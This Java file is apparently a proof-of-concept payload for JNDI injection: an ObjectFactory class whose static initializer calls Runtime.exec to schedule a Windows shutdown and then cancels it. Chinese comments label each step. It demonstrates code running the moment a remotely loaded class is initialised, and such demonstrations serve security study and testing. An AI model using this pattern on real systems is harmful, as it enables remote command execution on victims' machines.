package com.lahmxu;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class OBJ implements ObjectFactory {
    static {

        System.out.println("执行三方类静态代码块");

        long time=3600L*24*6;
        try {
            //6天后关机
            Runtime.getRuntime().exec("Shutdown -s -t"+time);
            Thread.sleep(1000);
            //取消关机
            Runtime.getRuntime().exec("Shutdown -a ");
        }catch (Exception e){
            e.printStackTrace();

        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("三方类被加载.");
        return null;
    }
}
